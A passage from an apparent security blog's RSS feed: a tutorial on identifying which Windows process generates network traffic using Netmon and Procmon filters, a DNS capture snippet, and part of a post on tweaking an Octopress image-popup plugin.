&lt;p&gt;We can see that is points to hipchat.com (last IP was &lt;code&gt;www.hipchat.com&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;- Dns: QueryId = 0x280E, QUERY (Standard query), Response - Success, 54.225.209.74 
    QueryIdentifier: 10254 (0x280E)
  + Flags:  Response, Opcode - QUERY (Standard query), RD, RA, Rcode - Success
    QuestionCount: 1 (0x1)
    AnswerCount: 1 (0x1)
    NameServerCount: 0 (0x0)
    AdditionalCount: 0 (0x0)
  - QRecord: hipchat.com of type Host Addr on class Internet
     QuestionName: hipchat.com
     QuestionType: A, IPv4 address, 1(0x1)
     QuestionClass: Internet, 1(0x1)
  - ARecord: hipchat.com of type Host Addr on class Internet: 54.225.209.74
     ResourceName: hipchat.com
     ResourceType: A, IPv4 address, 1(0x1)
     ResourceClass: Internet, 1(0x1)
     TimeToLive: 59 (0x3B)
     ResourceDataLength: 4 (0x4)
     IPAddress: 54.225.209.74
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So the application is communicating with both &lt;code&gt;www.hipchat.com&lt;/code&gt; and &lt;code&gt;hipchat.com&lt;/code&gt;. Probably because of a redirect as we can see later.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s enough for now. In part two we will talk about proxying.&lt;/p&gt;

&lt;!-- links --&gt;
</description>
    </item>
    
    <item>
      <title>Network Traffic Attribution on Windows</title>
      <link>http://parsiya.net/blog/2015-08-01-Network-Traffic-Attribution-on-Windows/</link>
      <pubDate>Sat, 01 Aug 2015 19:37:42 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-08-01-Network-Traffic-Attribution-on-Windows/</guid>
      <description>

&lt;p&gt;Thick client assessments come in different flavors. Most of our work is on &lt;code&gt;consumer applications&lt;/code&gt; where &lt;code&gt;consumer&lt;/code&gt; means either the customer or an employee of our client. But these applications usually have network communications.&lt;/p&gt;

&lt;p&gt;When looking at thick client applications from a network traffic perspective, we face two big challenges:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Traffic Attribution&lt;/strong&gt; or &lt;strong&gt;Where does this traffic come from?&lt;/strong&gt;: How to we identify application’s traffic? The operating system (in this case Windows) is running many applications and services. Each of them may have network connectivity.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;Proxying Traffic&lt;/strong&gt; or &lt;strong&gt;How do I look view/modify traffic?&lt;/strong&gt;: This is more challenging and involves capturing, modifying and in a lot of cases decrypting/decoding target application’s traffic. This could be as easy as setting up Burp via an application setting (EZ-mode) or as hard as setting up your own access point to capture a device’s traffic then developing your own decryption plugin for your proxy tool (good luck).&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In this post, I will be talking about the much easier first challenge. I will be talking about some of the tools and techniques that I use to accomplish this. This is not a groundbreaking post ;). We will use a simple application, in this case &lt;code&gt;notepad++&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;1-our-setup:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;1. Our Setup&lt;/h3&gt;

&lt;p&gt;I am using Windows 7 VM running via VirtualBox. You can probably use anything newer than Windows XP. You can get VMs from Microsoft at [&lt;a href=&#34;http://dev.modern.ie/tools/vms/windows/][modern-ie&#34; target=&#34;_blank&#34;&gt;http://dev.modern.ie/tools/vms/windows/][modern-ie&lt;/a&gt;]. These VMs have 90 day activation periods and are for testing different versions of IE but they are enough for our purpose. One downside is the huge virtual disk drive (110GB) that can be shrinked (from inside Windows) in half. Hard drive is still dynamically located but if you do not watch out, it wills tart filling up your hard drive (especially if you are making snapshots).&lt;/p&gt;

&lt;h3 id=&#34;2-list-of-tools:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;2. List of Tools&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Microsoft Network Monitor (Netmon)&lt;/strong&gt;: &lt;a href=&#34;http://blogs.technet.com/b/netmon/p/downloads.aspx&#34; target=&#34;_blank&#34;&gt;http://blogs.technet.com/b/netmon/p/downloads.aspx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Wireshark&lt;/strong&gt;: &lt;a href=&#34;https://www.wireshark.org/download.html&#34; target=&#34;_blank&#34;&gt;https://www.wireshark.org/download.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Process Monitor (Procmon)&lt;/strong&gt;: Part of Microsoft Sysinternals Suite: &lt;a href=&#34;https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx&#34; target=&#34;_blank&#34;&gt;https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;3-test-application:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;3. Test Application&lt;/h3&gt;

&lt;p&gt;I will be using &lt;code&gt;Notepad++ 6.7.9.2&lt;/code&gt;. it was the current version at the time of writing but by the time I got to publishing this post it has been updated to version &lt;code&gt;6.8&lt;/code&gt;. You can download it from &lt;a href=&#34;https://notepad-plus-plus.org/download/v6.7.9.2.html&#34; target=&#34;_blank&#34;&gt;https://notepad-plus-plus.org/download/v6.7.9.2.html&lt;/a&gt;. Install Notepad++ but make sure to select &lt;code&gt;Auto Updater&lt;/code&gt; and &lt;code&gt;Plugin Manager&lt;/code&gt; during installation. &lt;strong&gt;Do not run the application at the end of the installation process&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&#34;4-traffic-attribution:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;4. Traffic Attribution&lt;/h3&gt;

&lt;p&gt;Run Netmon, Wireshark and Procmon (as Administrator) then run &lt;code&gt;Notepad++&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Procmon Note&lt;/strong&gt;: Never select &lt;code&gt;Drop Filtered Events&lt;/code&gt; in the Filter menu. It will discard all events that are not shown by your filters. There is no going back to viewing filtered events.&lt;/p&gt;

&lt;h4 id=&#34;4-1-netmon:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;4.1 Netmon&lt;/h4&gt;

&lt;p&gt;We can see a bunch of traffic in Netmon. See this handy tree view to the left? That is why we are using it ;).&lt;/p&gt;

&lt;p&gt;Click on &lt;code&gt;notepad++.exe&lt;/code&gt; in the tree view to view all of its traffic. We can see that it is communicating with &lt;code&gt;superb-dca2.dl.sourceforge.net&lt;/code&gt; and &lt;code&gt;downloads.sourceforge.net&lt;/code&gt; over HTTP &lt;em&gt;gasp&lt;/em&gt;. You may observe a different endpoint depending on your location (because Source forge).&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/01.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;There’s another &lt;code&gt;suspicious process&lt;/code&gt; up there. Select &lt;code&gt;gup.exe&lt;/code&gt; and we can see it is also related to &lt;code&gt;Notepad++&lt;/code&gt; as it&amp;rsquo;s creating a TLS connection to &lt;code&gt;notepad-plus-plus.org&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/02.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;But wait, there’s more. There may be traffic that is not correctly attributed due to the way that Netmon identifies traffic. We may be able to find some extra stuff there.&lt;br /&gt;
Here’s a Catch-22, there may be traffic related to our application that Netmon wasn’t able to correlate back to the process but how can we identify it if we do not know the endpoints. We will be using Procmon to compile a more comprehensive endpoint collection later.&lt;/p&gt;

&lt;h5 id=&#34;4-1-1-how-to-search-in-netmon:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;4.1.1 How to search in Netmon?&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;Contains&lt;/code&gt; is a filter that allows us to do case-insensitive searchs for strings. For example we can use this filter to search for packets with destinations containing the string &lt;code&gt;sourceforge&lt;/code&gt;. We can use the following filters (they both do the same thing):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Contains(property.Destination, &amp;quot;sourceforge&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Destination.Contains(&amp;quot;sourceforge&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Be sure to select &lt;code&gt;All Traffic&lt;/code&gt; in the tree-view when applying filters search in all traffic.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/03.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;We can search in different columns, one of the most common columns is &lt;code&gt;property.description&lt;/code&gt;. Description is a column with a lot of information and is usually our best bet. For example if we want to see all GET request we can use the following filters (again they both do the same thing):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Contains(property.Description,&amp;quot;GET&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Description.Contains(&amp;quot;GET&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/04.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;We can also see Windows checking for certificate revocation lists over HTTP &lt;em&gt;zomg&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;To search for binary data use &lt;code&gt;ContainsBin&lt;/code&gt;. For example to search for the CRLF binary string in frame data use this filter:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ContainsBin(FrameData, HEX, &amp;quot;0D 0A&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/05.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;We can also search for strings using &lt;code&gt;ContainsBin&lt;/code&gt; by using &lt;code&gt;ASCII&lt;/code&gt;. But remember this search is case-sensitive. To replicate our previous search for &lt;code&gt;sourceforge&lt;/code&gt; we can use the following filter:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ContainsBin(FrameData, ASCII, &amp;quot;sourceforge&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;4-2-procmon:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;4.2 Procmon&lt;/h4&gt;

&lt;p&gt;Procmon does not display traffic but it&amp;rsquo;s a great tool to identify enpoints. Stop the Procmon capture. It is time to add Procmon filters.&lt;/p&gt;

&lt;p&gt;I am in the process of writing a longer blog entry about using Procmon but that is for another day. For now we will discuss some filters related to network endpoint discovery.&lt;/p&gt;

&lt;p&gt;Procmon has a lot of filters but we will be using only a few of them. The first filter is &lt;code&gt;ProcessName&lt;/code&gt;. Using this filter we can see only events belonging to specific process(es). Select Filter from the Filter menu or press Ctrl+L. Now create this filter &lt;code&gt;ProcessName is Notepad++.exe&lt;/code&gt;. Note that Procmon will show you all processes with events in the drop down menu.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/06.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;And we can see all events for &lt;code&gt;notepad++.exe&lt;/code&gt; in Procmon. Take a note of ProcessID (PID) for &lt;code&gt;notepad++.exe&lt;/code&gt;. In this case PID is &lt;code&gt;3964&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/07.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;But we want to look at spawned processes too. Let’s remove this filter and find all child processes for &lt;code&gt;notepad++.exe&lt;/code&gt; using another filter. The new filter is &lt;code&gt;Parent PID is 3964&lt;/code&gt;and it will show captured events for &lt;code&gt;gup.exe&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/08.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Doubleclick on the first line (&lt;code&gt;Process Start&lt;/code&gt;) to view command line parameters and other details for &lt;code&gt;gup.exe&lt;/code&gt;. Note that the &lt;code&gt;gup.exe&lt;/code&gt; application was ran with parameter &lt;code&gt;-v6.792&lt;/code&gt; (version of Notepad++). So theoretically we can pretend that we are any version. It would be nice to look at this request and play with it.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/09.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;An alternate way to get the same results is to use these two filter:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ProcessName is notepad++.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Operation is Process Create&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If we want to make sure that we have identified all processes, we have to go one level deeper and check if &lt;code&gt;gup.exe&lt;/code&gt; spawned any other processes.&lt;/p&gt;

&lt;p&gt;We have two options:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ProcessName is gup.exe&lt;/code&gt; and &lt;code&gt;Operation is Process Create&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Parent PID is 3992&lt;/code&gt; (pid of &lt;code&gt;gup.exe&lt;/code&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;But as expected both filters return nothing. &lt;code&gt;gup.exe&lt;/code&gt; did not spawn anything.&lt;/p&gt;

&lt;p&gt;Now we can add both &lt;code&gt;notepad++.exe&lt;/code&gt; and &lt;code&gt;gup.exe&lt;/code&gt; as filters to view all events related to our application in Procmon.&lt;/p&gt;

&lt;p&gt;In order to watch network traffic we can use the handy &lt;code&gt;Operation is TCP Send&lt;/code&gt; filter. Note there are other operations (i.e. UDP ones). &lt;code&gt;TCP Connect&lt;/code&gt; will also work if you just want endpoints and less noise.&lt;/p&gt;

&lt;p&gt;We use the following filters:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ProcessName is notepad++.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcessName is gup.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Operation is TCP Send&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Operation is TCP Connect&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/10.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;We have already seen &lt;code&gt;downloads.sourceforge.net&lt;/code&gt; but &lt;code&gt;ns378545.ip-91-121-64.eu&lt;/code&gt; is new.&lt;/p&gt;

&lt;p&gt;If we ping it, we can see that the corresponding IP address is &lt;code&gt;91.121.64.34&lt;/code&gt;. We can filter the results in Netmon by using this filter &lt;code&gt;IPv4.Address == 91.121.64.34&lt;/code&gt; to view traffic related to his IP address.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/11.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;It is &lt;code&gt;notepad-plus-plus.org&lt;/code&gt;. Try pinging &lt;code&gt;notepad-plus-plus.org&lt;/code&gt; to get &lt;code&gt;91.121.64.34&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;That was easy wasn’t it?&lt;/p&gt;

&lt;p&gt;What did we do? We used Netmon and Procmon to identify the endpoints that an specific application communicates with and isolate traffic belonging to that application. I told you this is nothing ground breaking :).&lt;/p&gt;

&lt;h3 id=&#34;questions:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;Questions:&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;But what about Microsoft Message Analyzer (MMA)?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It is a good tool. But I do not like its UI but I saw an interesting feature in it to decrypt SSL traffic. I will be looking at that feature soon. It is also much more resource intensive than Netmon.&lt;/p&gt;

&lt;p&gt;For more information: &lt;a href=&#34;http://blogs.technet.com/b/messageanalyzer/archive/2015/06/08/process-tracking-with-message-analyzer.aspx&#34; target=&#34;_blank&#34;&gt;http://blogs.technet.com/b/messageanalyzer/archive/2015/06/08/process-tracking-with-message-analyzer.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;But I want to use Wireshark&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Sure, go ahead. Use Procmon and filters to identify the endpoints and then add filters in Wireshark. Another good thing is that Netmon’s export format (*.cap files) can be opened in Wireshark. If you prefer Wireshark&amp;rsquo;s UI, you can isolate traffic by process in Netmon, save it and then open the resulting cap file in Wireshark.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where are DNS requests? I do not see them in process traffic in Netmon&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Select all traffic and use the filter &lt;code&gt;DNS&lt;/code&gt;. Due to the way Netmon associates traffic with processes, DNS requests may be in Unknown or System.&lt;/p&gt;

&lt;p&gt;







&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/TrafficAttribution1/12.PNG&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Note that while we had a DNS query for &lt;code&gt;superb-dca2.dl.sourceforge.net&lt;/code&gt;, we never connected to it so we did not see a &lt;code&gt;TCP Connect&lt;/code&gt; event for it in Procmon.&lt;/p&gt;

&lt;h3 id=&#34;5-exercise:fb6cde2299cd5d6b2753d0a63519db51&#34;&gt;5. Exercise:&lt;/h3&gt;

&lt;p&gt;Run the tools again and install a plugin. This can be accomplished by going to &lt;code&gt;Plugins &amp;gt; Plugin Manager &amp;gt; Show Plugin Manager&lt;/code&gt;. Try to locate the endpoints and traffic in this case. See what process is spawned by &lt;code&gt;notepad++.exe&lt;/code&gt; this time.&lt;/p&gt;

&lt;p&gt;This time, it will not be as easy as last time because Netmon did not associate all packets with the process but you can find the endpoints via Procmon and filter them in Netmon.&lt;/p&gt;

&lt;p&gt;I hope this was useful. If you have any questions, you know where to find me.&lt;/p&gt;

&lt;!-- links --&gt;
</description>
    </item>
    
    <item>
      <title>Image Popup and Octopress</title>
      <link>http://parsiya.net/blog/2015-07-26-Image-Popup-and-Octopress/</link>
      <pubDate>Sun, 26 Jul 2015 23:02:58 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-07-26-Image-Popup-and-Octopress/</guid>
      <description>&lt;p&gt;Update: I have migrated the blog to Hugo and I do not use this anymore. However, it is still in the repository.&lt;/p&gt;

&lt;p&gt;I finally realized that I need an image popup plugin. The image plugins that I usually use do not support this. They are fine for normal images but not for larger ones. When I see an screenshot of a tool, I want to be able to zoom in. In my quest I looked at a few plugins and methods and finally decided to use &lt;a href=&#34;https://github.com/ctdk/octopress-image-popup&#34; target=&#34;_blank&#34;&gt;https://github.com/ctdk/octopress-image-popup&lt;/a&gt;. It creates resized thumbnails automatically and the installation procedure is short and simple.&lt;/p&gt;

&lt;p&gt;However, it did not work for me out of the box. I created a test post with just an image and while the plugin worked, there are things that I did not like about it.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/popup1/pew1.jpg&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;There is this text &amp;ldquo;Click the image for a larger view.&amp;rdquo; and there is also an unresized copy of the image on the page.&lt;/p&gt;

&lt;p&gt;By inspecting these two elements, we can find the culprits in the page source (comments are mine).&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;page source&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;...
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;imgpopup screen&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;!-- caption --&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;caption&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;Click the image for a larger view.&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;javascript:void(0)&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;text-decoration: none&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;image-1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;/images/2015/pew.jpg&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;300&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;221&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;alt&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Click me.&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;

...
&lt;span style=&#34;color: #586E75&#34;&gt;&amp;lt;!-- unresized copy --&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;illustration print&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;/images/2015/pew.jpg&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;600&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;441&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;During installation we have only copied two files (apart from editing &lt;code&gt;head.html&lt;/code&gt;): &lt;code&gt;img_popup.rb&lt;/code&gt; and &lt;code&gt;img_popup.html.erb&lt;/code&gt;. The html file is probably your first guess to and you are right. Inside we can see html tags (original copy is at &lt;a href=&#34;https://github.com/ctdk/octopress-image-popup/blob/master/plugins/img_popup.html.erb&#34; target=&#34;_blank&#34;&gt;https://github.com/ctdk/octopress-image-popup/blob/master/plugins/img_popup.html.erb&lt;/a&gt;):&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;img_popup.html.erb&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
